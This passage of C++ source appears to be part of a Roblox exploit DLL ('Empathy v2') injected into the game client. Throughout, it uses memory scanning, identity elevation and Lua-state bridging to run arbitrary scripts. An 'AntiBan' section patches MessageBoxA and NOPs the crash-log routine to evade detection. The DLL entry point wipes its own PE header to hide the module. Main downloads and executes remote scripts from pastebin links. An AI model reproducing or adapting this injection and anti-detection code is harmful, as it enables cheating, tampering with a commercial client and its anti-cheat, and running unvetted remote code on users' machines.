	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			// read all (real) files in current folder
			// , delete '!' read other 2 default folder . and ..
			if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
				names.push_back(fd.cFileName);
			}
		} while (::FindNextFile(hFind, &fd));
		::FindClose(hFind);
	}
	return names;
}


int getupvalues(lua_State* L)
{
	lua_pushvalue(L, 1);
	lua_newtable(L);

	int idx = 1;
	while (true)
	{
		const char* name = lua_getupvalue(L, -2, idx);

		if (!name)
		{
			break;
		}

		lua_setfield(L, -2, name);
		idx++;
	}
	return 1;
}

int SynGetUpValues(lua_State* L) {
	luaL_argcheck(L, lua_isfunction(L, 1) || lua_isnumber(L, 1), 1, "function or number expected");
	if (lua_isnumber(L, 1))
	{
		lua_Debug ar;
		if (!lua_getstack(L, lua_tointeger(L, 1), &ar))
			return luaL_argerror(L, 1, "level out of range");
		lua_getinfo(L, "f", &ar);
	}
	lua_newtable(L);
	int n = 1;
	while (const char* name = lua_getupvalue(L, -2, n))
	{
		lua_pushstring(L, name);
		lua_pushvalue(L, -2);
		lua_settable(L, -4);
		lua_pop(L, 1);
		n++;
	}
	return 1;
}

string getHWID() {
	HW_PROFILE_INFO hwProfileInfo;
	GetCurrentHwProfile(&hwProfileInfo);
	string hwidWString = hwProfileInfo.szHwProfileGuid;
	string hwid(hwidWString.begin(), hwidWString.end());

	return hwid;
}

#define UNLEN       256   
bool xd = true;

void SetIdentity(int id)
{
	int script[] = { NULL,NULL };
	SandBoxThread(RLS, id, (int)script);
}
static int _require(lua_State* LS)
{
	SetIdentity(2);
	Sleep(100);
}

static int _drawrect(lua_State* L) {
	int left, top, right, bottom, r, g, b;
	left = lua_tonumber(L, 1);
	top = lua_tonumber(L, 2);
	right = lua_tonumber(L, 3);
	bottom = lua_tonumber(L, 4);
	r = lua_tonumber(L, 5);
	g = lua_tonumber(L, 6);
	b = lua_tonumber(L, 7);
	HDC screenDC = ::GetDC(0);
	SetDCPenColor(screenDC, RGB(r, g, b));::Rectangle(screenDC, left, top, right, bottom);::ReleaseDC(0, screenDC);
	return 0;
}

struct module
{
	DWORD dwBase, dwSize;
};

class SignatureScanner
{
public:
	module TargetModule;  // Hold target module
	HANDLE TargetProcess; // for target process
	DWORD  TargetId;      // for target process

	// For getting a handle to a process
	HANDLE GetProcess(char* processName)
	{
		HANDLE handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		PROCESSENTRY32 entry;
		entry.dwSize = sizeof(entry);

		do
			if (!strcmp(entry.szExeFile, processName)) {
				TargetId = entry.th32ProcessID;
				CloseHandle(handle);
				TargetProcess = OpenProcess(PROCESS_ALL_ACCESS, false, TargetId);
				return TargetProcess;
			}
		while (Process32Next(handle, &entry));

		return false;
	}

	// For getting information about the executing module
	module GetModule(char* moduleName) {
		HANDLE hmodule = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, TargetId);
		MODULEENTRY32 mEntry;
		mEntry.dwSize = sizeof(mEntry);

		do {
			if (!strcmp(mEntry.szModule, (LPSTR)moduleName)) {
				CloseHandle(hmodule);

				TargetModule = { (DWORD)mEntry.hModule, mEntry.modBaseSize };
				return TargetModule;
			}
		} while (Module32Next(hmodule, &mEntry));

		module mod = { (DWORD)false, (DWORD)false };
		return mod;
	}

	// Basic WPM wrapper, easier to use.
	template <typename var>
	bool WriteMemory(DWORD Address, var Value) {
		return WriteProcessMemory(TargetProcess, (LPVOID)Address, &Value, sizeof(var), 0);
	}

	// Basic RPM wrapper, easier to use.
	template <typename var>
	var ReadMemory(DWORD Address) {
		var value;
		ReadProcessMemory(TargetProcess, (LPCVOID)Address, &value, sizeof(var), NULL);
		return value;
	}

	// for comparing a region in memory, needed in finding a signature
	bool MemoryCompare(const BYTE* bData, const BYTE* bMask, const char* szMask) {
		for (; *szMask; ++szMask, ++bData, ++bMask) {
			if (*szMask == 'x' && *bData != *bMask) {
				return false;
			}
		}
		return (*szMask == NULL);
	}

	// for finding a signature/pattern in memory of another process
	DWORD FindSignature(DWORD start, DWORD size, const char* sig, const char* mask)
	{
		BYTE* data = new BYTE[size];
		SIZE_T bytesRead;

		ReadProcessMemory(TargetProcess, (LPVOID)start, data, size, &bytesRead);

		for (DWORD i = 0; i < size; i++)
		{
			if (MemoryCompare((const BYTE*)(data + i), (const BYTE*)sig, mask)) {
				return start + i;
			}
		}
		delete[] data;
		return NULL;
	}
};

namespace AntiBan
{
#define log_addy_start 0xB838D
	int WINAPI h_MessageBox(
		_In_opt_ HWND    hWnd,
		_In_opt_ LPCTSTR lpText,
		_In_opt_ LPCTSTR lpCaption,
		_In_     UINT    uType
	) {
		std::string str_lp = lpText;
		std::string str_cap = lpCaption;
		if (str_cap == "Roblox Crash") {
			DWORD log_start = log_addy_start + (DWORD)GetModuleHandleA(NULL);
			DWORD old;
			for (int i = 0; i < 79; i++) {
				VirtualProtect((LPVOID)(log_start + i), 1, PAGE_EXECUTE_READWRITE, &old);
				*(char*)(log_start + i) = 0x90;
				VirtualProtect((LPVOID)(log_start + i), 1, old, &old);
			}
		}
		wchar_t* str_lp_res = new wchar_t[4096];
		wchar_t* str_cap_res = new wchar_t[4096];
		XorS(title, "Empathy v2");
		XorS(message, "Empathy Crashed -Error ur dad gone for milk");
		MultiByteToWideChar(CP_ACP, NULL, message.decrypt(), -1, str_lp_res, 4096);
		MultiByteToWideChar(CP_ACP, NULL, title.decrypt(), -1, str_cap_res, 4096);
		return MessageBoxW(hWnd, str_lp_res, str_cap_res, uType);
	}


	void LoadAntiBan() {
		DWORD o;
		VirtualProtect((LPVOID)&MessageBoxA, 1, PAGE_EXECUTE_READWRITE, &o);
		*(char*)(&MessageBoxA) = 0xE9;
		*(DWORD*)((DWORD)&MessageBoxA + 1) = ((DWORD)&h_MessageBox - (DWORD)&MessageBoxA) - 5;
		VirtualProtect((LPVOID)&MessageBoxA, 1, o, &o);
	}

}

int decompile(lua_State* L) {
	lua_pushstring(L, "--SpiderCore decompiler currently unsupport LuaU.");
	return 1;
}

int getlocal(lua_State* L) {
	luaL_checktype(L, 1, R_LUA_TNUMBER);
	luaL_checktype(L, 2, R_LUA_TSTRING);

	const char* Name = lua_tostring(L, 2);

	lua_Debug ar;
	if (!lua_getstack(L, lua_tointeger(L, 1), &ar))
		return luaL_argerror(L, 1, "level out of range");

	int n = 1;
	while (const char* name = lua_getlocal(L, &ar, n))
	{
		if (!strcmp(name, Name)) return 1;
		lua_pop(L, 1);
		n++;
	}

	lua_pushnil(L);
	return 1;
}

int setlocal(lua_State* L) {

	luaL_checktype(L, 1, R_LUA_TNUMBER);
	luaL_checktype(L, 2, R_LUA_TSTRING);
	luaL_checkany(L, 3);

	const char* Name = lua_tostring(L, 2);

	lua_Debug ar;
	if (!lua_getstack(L, lua_tointeger(L, 1), &ar))
		return luaL_argerror(L, 1, "level out of range");

	int n = 1;
	while (const char* name = lua_getlocal(L, &ar, n))
	{
		lua_pop(L, 1);
		if (!strcmp(name, Name))
		{
			lua_pushvalue(L, 3);
			lua_setlocal(L, &ar, n);
			lua_pushboolean(L, true);
			return 1;
		}
		n++;
	}

	lua_pushboolean(L, false);
	return 1;
}


int getlocals2(lua_State* L) {
	lua_Debug ar;
	if (!lua_getstack(L, luaL_checkinteger(L, 1), &ar))
		return luaL_argerror(L, 1, "level out of range");

	lua_newtable(L);

	int n = 1;
	while (const char* name = lua_getlocal(L, &ar, n))
	{
		if (strcmp("(*temporary)", name) != 0)
		{
			lua_pushstring(L, name);
			lua_pushvalue(L, -2);
			lua_settable(L, -4);
		}
		lua_pop(L, 1);
		n++;
	}

	return 1;
}


struct HandleData
{
	unsigned long ProcID;
	HWND Handle;
};

BOOL CALLBACK EnumWindowsCallback(HWND handle, LPARAM lParam)
{
	HandleData& data = *(HandleData*)lParam;
	unsigned long process_id = 0;
	GetWindowThreadProcessId(handle, &process_id);
	char WindowName[255];
	GetWindowTextA(handle, WindowName, sizeof(WindowName));
	XorS(__ROBLOX, "Roblox");
	if (data.ProcID != process_id || strcmp(WindowName, __ROBLOX.decrypt()) != 0)
		return TRUE;

	data.Handle = handle;
	return FALSE;
}

HWND FindMainWindow(unsigned long process_id)
{
	HandleData data{};
	data.ProcID = process_id;
	data.Handle = nullptr;
	EnumWindows(EnumWindowsCallback, (LPARAM)&data);
	return data.Handle;
}

int custom_setclipboard(lua_State* L) {
	HWND RobloxWindow;
	std::size_t Length;
	XorS(err1 ,"failed to open clipboard");
	XorS(err2, "failed to allocate space for clipboard");
	XorS(err3, "failed to set clipboard");
	//--Find Roblox Window--//
	RobloxWindow = FindMainWindow(GetCurrentProcessId());
	//--Function handler--//
	const char* String = luaL_checklstring(L, 1, &Length);
	if (!OpenClipboard(RobloxWindow) || !EmptyClipboard())
	{
		return luaL_error(L, err1.decrypt());
	}
	HGLOBAL HG = GlobalAlloc(GMEM_FIXED, Length + 1);
	if (HG == NULL)
	{
		CloseClipboard();
		return  luaL_error(L, err2.decrypt());
	}
	memcpy(HG, String, Length + 1);
	if (!SetClipboardData(CF_TEXT, HG))
	{
		CloseClipboard();
		GlobalFree(HG);

		return  luaL_error(L, err3.decrypt());
	}
	CloseClipboard();
	return 0;
}

#include <cstdlib>
#include <random>
class Randomer {
	// random seed by default
	std::mt19937 gen_;
	std::uniform_int_distribution<size_t> dist_;

public:
	/*  ... some convenient ctors ... */

	Randomer(size_t min, size_t max, unsigned int seed = std::random_device{}())
		: gen_{ seed }, dist_{ min, max } {
	}

	// if you want predictable numbers
	void SetSeed(unsigned int seed) {
		gen_.seed(seed);
	}

	size_t operator()() {
		return dist_(gen_);
	}
};

int EncodeBase64(lua_State* L) {
	string data = lua_tostring(L, 1);
	lua_pushstring(L, base64_encode(data).c_str());
	return 1;
}

int DecodeBase64(lua_State* L) {
	string data = lua_tostring(L, 1);
	lua_pushstring(L, base64_decode(data).c_str());
	return 1;
}

int isrbxactive(lua_State* L) {
	HWND RobloxWindow;
	//--Find Roblox Window--//
	RobloxWindow = FindMainWindow(GetCurrentProcessId());
	//--Function handler--//
	lua_pushboolean(L, GetForegroundWindow() == RobloxWindow);
	return 1;
}



int GetGameFromLogFile() {
	int replicator_address;

	// Get the full path of RobloxPlayerBeta.exe (the
	// program that this DLL gets injected into)
	char c_fpath[MAX_PATH];
	GetModuleFileNameA(GetModuleHandleA(0), c_fpath, sizeof(c_fpath));
	std::string fpath(c_fpath), logspath = "", filepath = "";
	for (int i = 0; i < fpath.length(); i++) {
		if ((i + 8) < fpath.length()) {
			// Erase some of the full path, and
			// only go up to the "Versions" directory
			// in the current roblox version folder
			if (fpath.substr(i, 8) == "Versions") break; else {
				logspath += fpath[i];
			}
		}
		else break;
	}
	logspath += "logs"; // check logs directory


	// logspath is now the full path to the ROBLOX logs.
	// Now we are going to sift through to get the most
	// recently-created log file using a code that can
	// be found online.

	WIN32_FIND_DATAA FindFileData;
	HANDLE hFind;
	char patter[MAX_PATH];

	FILETIME bestDate = { 0, 0 };
	FILETIME curDate;

	memset(patter, 0x00, MAX_PATH);
	sprintf_s(patter, "%s\\*.txt", logspath.c_str());
	hFind = FindFirstFileA(patter, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		do { //ignore current and parent directories
			if (strcmp(FindFileData.cFileName, ".") == 0 || strcmp(FindFileData.cFileName, "..") == 0)
				continue;
			if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
				std::string temppath = (logspath + "\\" + FindFileData.cFileName);
				// Check creation date and time, verify that it
				// is the MOST recently created Log file for the
				// game that is currently running!
				curDate = FindFileData.ftCreationTime;
				if (CompareFileTime(&curDate, &bestDate) > 0) {
					bestDate = curDate;
					filepath = temppath;
				}
			}
		} while (FindNextFileA(hFind, &FindFileData));
		FindClose(hFind);
	}

	// Read the file, Put its contents into a std::string
	std::string fdata = "";
	std::ifstream ifs(filepath, std::ifstream::in);
	char c = ifs.get();
	while (ifs.good()) fdata += c, c = ifs.get();
	ifs.close();

	// Get the line from the log file that displays
	// the ClientReplicator address!
	size_t pos = fdata.find("Replicator created: ");
	if (pos != std::string::npos) {
		pos = pos + 20; // Skip to the end of the string.

		// Convert the address here (8 character hex string),
		// to a number value that we can use in our DLL!
		std::stringstream ss;
		ss << std::hex << fdata.substr(pos, 8).c_str();
		ss >> replicator_address;
	}
	DWORD Game = *(DWORD*)(*(DWORD*)(replicator_address + ScriptContextVFT_Addy) + ScriptContextVFT_Addy);//GetParentOffset2x
	return Game;
}

namespace ScriptCOontext {
	DWORD hookStateIndex(DWORD hooklocation, int offset) {
		DWORD* context = reinterpret_cast<DWORD*>(hooklocation);
		//return (int)(&context[0xAC] - *(DWORD*)&context[0xAC]);
		return (int)& context[offset] - context[offset];
	}
	void scriptcontext() {
		DWORD ScriptContext = Memory::Scan(PAGE_READWRITE, (char*)&ScriptContextVFT_Addy, (char*)"xxxx");
		RLS = hookStateIndex(ScriptContext, 172);
	}
}

static int EQ(lua_State* Thread) {
	lua_pushboolean(Thread, (*(DWORD*)lua_touserdata(Thread, 1) == *(DWORD*)lua_touserdata(Thread, 2)));
	return 1;
}

static int GC(lua_State* Thread) {
	void* UD = lua_touserdata(Thread, 1);
	if (RLS) {
		r_lua_rawgeti(RLS, LUA_REGISTRYINDEX, (int)UD);
		if (r_lua_type(RLS, -1) <= R_LUA_TNIL) {
			lua_pushnil(Thread);
			lua_rawseti(Thread, LUA_REGISTRYINDEX, (int)UD);
		}
	}
	return 0;
}

int error(lua_State* L) {
	Print(3, lua_tostring(L, -1));
	return 1;
}

int info(lua_State* L) {
	Print(1, lua_tostring(L, -1));
	return 1;
}

int httpgetimpl(lua_State* LS) {
	lua_pushstring(LS, download_url(lua_tostring(LS, -1)).c_str());
	return 1;
}

int SynGetReg(lua_State* L) {
	lua_pushvalue(L, LUA_REGISTRYINDEX);
	return 1;
}

int IsReady(lua_State* L) {
	lua_pushboolean(L, READY);
	return 1;
}

int hashProtect(lua_State* L) {
	string input = lua_tostring(L, -1);
	lua_pushstring(L, sha256(input).c_str());
	return 1;
}

int newcclosure(lua_State* L) {
	if (!lua_iscfunction(L, -1))
		return luaL_argerror(L, -1, "expected function as argument #1");
	Wrapper::UnWrap(L, RLS, 1);
	lua_tocfunction(L, -1);
	return 1;
}

int hookfunc(lua_State* L) {
	if (lua_type(L, -1) != R_LUA_TFUNCTION)
		return luaL_argerror(L, -1, "<function> expected");
	if (lua_type(L, -2) != R_LUA_TFUNCTION)
		return luaL_argerror(L, -1, "<function> expected");
	Wrapper::Wrap(RLS, L, 1);
	lua_tocfunction(L, -1);
	Wrapper::UnWrap(L, RLS, 1);
	return 1;
}

static const struct luaL_Reg debugfuncs[] = {
	{"setmetatable", Debug_SetMetaTable},
    {"getfenv", getfenv},
    {"setfenv", Debug_setfenv},
    {"getmetatable", Debug_GetMetaTable},
    {"getregistry", Debug_GetRegistry},
    {"traceback", Debug_traceback},
    {"getupvalues", getupvalues},
    {"getupvalue", Debug_getupvalue},
	{"setupvalue", Debug_setupvalue},
	{"setlocal", setlocal},
	{"getlocal", getlocal},
	{"getlocals", getlocals2},
	{"getinfo", Debug_getinfo},
    {NULL, NULL}
};

static const struct luaL_Reg CoreFunctions[] = {
	{"EncodeBase64", EncodeBase64},
	{"DecodeBase64", DecodeBase64},
    {"IsReady", IsReady},
    {"Hash", hashProtect},
    {NULL, NULL}
};

void Main()
{
	XorS(loadstringscript, "loadstring(game:HttpGet(\"https://pastebin.com/raw/VhMGJgRS \",true))()");
	XorS(UTF8, "https://raw.githubusercontent.com/meepen/Lua-5.1-UTF-8/master/utf8.lua");
	XorS(IniScript, "https://pastebin.com/raw/6Hym6h7G");
	//XorS(requireFIX, "loadstring(game:HttpGet(\"https://pastebin.com/raw/WXrZ1bxM \",true))()");
	DWORD ScriptContext = Memory::Scan(PAGE_READWRITE, (char*)&ScriptContextVFT_Addy, (char*)"xxxx");
	RLS = ScriptContext + 56 * 0 + 172 + *(DWORD*)(ScriptContext + 56 * 0 + 172);
	LS = luaL_newstate();
	luaL_openlibs(LS);
	*reinterpret_cast<int*>(*reinterpret_cast<int*>(RLS + 128) + 24) = 6;
	VehHandlerpush();
	std::vector<std::string> Globals{
"printidentity","game","Game","workspace","Workspace",
"Axes","BrickColor","CFrame","Color3","ColorSequence","ColorSequenceKeypoint",
"NumberRange","NumberSequence","NumberSequenceKeypoint","PhysicalProperties","Ray",
"Rect","Region3","Region3int16","TweenInfo","UDim","UDim2","Vector2",
"Vector2int16","Vector3","Vector3int16","Enum","Faces",
"Instance","math","warn","typeof","type", "spawn", "Spawn", "print",
"printidentity","ypcall","Wait","wait","delay","Delay","tick","LoadLibrary",
"Path"
	};
	for (auto func : Globals) {
		WrapG(RLS, LS, func.c_str());
	}
	lua_register(LS, "setreadonly", setreadonly);
	lua_register(LS, "isreadonly", custom_isreadonly);
	lua_register(LS, "getrawmetatable", custom_getrawmetatable);
	lua_register(LS, "toclipboard", CopyString);
	lua_register(LS, "setclipboard", custom_setclipboard);
	lua_register(LS, "write_clipboard", custom_setclipboard);
	lua_register(LS, "getgenv", custom_getgenv);
	lua_register(LS, "getsenv", custom_getgenv);
	lua_register(LS, "getrenv", custom_getgenv);
	lua_register(LS, "getreg", getreg);
	lua_register(LS, "getfenv", getfenv);
	lua_register(LS, "require", custom_require);
	lua_register(LS, "set_identity", setidentity);
	lua_register(LS, "checkcaller", CheckCaller);
	lua_register(LS, "LoadLibrary", custom_LoadLibrary);
	lua_register(LS, "is_protosmasher_caller", CheckCaller);
	lua_register(LS, "isrbxactive", isrbxactive);
	lua_register(LS, "EQ", EQ);
	lua_register(LS, "newcclosure", newcclosure);
	lua_register(LS, "GC", GC);
	lua_register(LS, "info", info);
	lua_register(LS, "error", error);
	lua_register(LS, "validfgwindow", isrbxactive);
	luaL_register(LS, "debug", debugfuncs);
	luaL_register(LS, "Core", CoreFunctions);
	lua_register(LS, "DLS", httpgetimpl);
	luaopen_bit(LS);
	lua_register(LS, "islclosure", islclosure);
	lua_register(LS, "is_lclosure", islclosure);
	lua_register(LS, "getconnections", getconnections);
	lua_register(LS, "getconnectionfunc", getconnectionfunc);
	lua_register(LS, "getconnectionstate", getconnectionstate);
	KeyBoardLibs::RegisterKeyBoardLibs(LS);
	MouseLibs::RegisterMouseLibs(LS);
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)LuaPipe, NULL, NULL, NULL);
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)InitImGui, NULL, NULL, NULL);
	AntiBan::LoadAntiBan();
	Sleep(3000);
	_env::ExecuteScript(loadstringscript.decrypt());
    _env:ExecuteScript(download_url(UTF8.decrypt()).c_str());
	_env::ExecuteScript(download_url(IniScript.decrypt()).c_str());
	char Path[MAX_PATH];
	Files::GetFile("E2.dll", "AutoExec\\", Path, MAX_PATH);
	std::string FinalisedPath = Path;
	std::vector<std::string> Files;
	Files::GetFilesInDirectory(Files, FinalisedPath, 0);
	for (std::vector<std::string>::iterator it = Files.begin(); it != Files.end(); it++) {
		std::string FinalPath = FinalisedPath + *it;
		std::string FileBuffer;
		if (Files::ReadFile(FinalPath, FileBuffer, 0)) {
			_env::ExecuteScript(FileBuffer.c_str());
		}
		else {
		}
	}
	READY = true;
}

BOOL APIENTRY DllMain(HMODULE Module, DWORD Reason, LPVOID) {
	switch (Reason)
	{
	case DLL_PROCESS_ATTACH:
		DisableThreadLibraryCalls(Module);
		DWORD OldProtection;
		VirtualProtect(Module, 0x1000, PAGE_READWRITE, &OldProtection);
		ZeroMemory(Module, 0x1000);
		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Main, NULL, NULL, NULL);
		break;
	}
	return TRUE;
}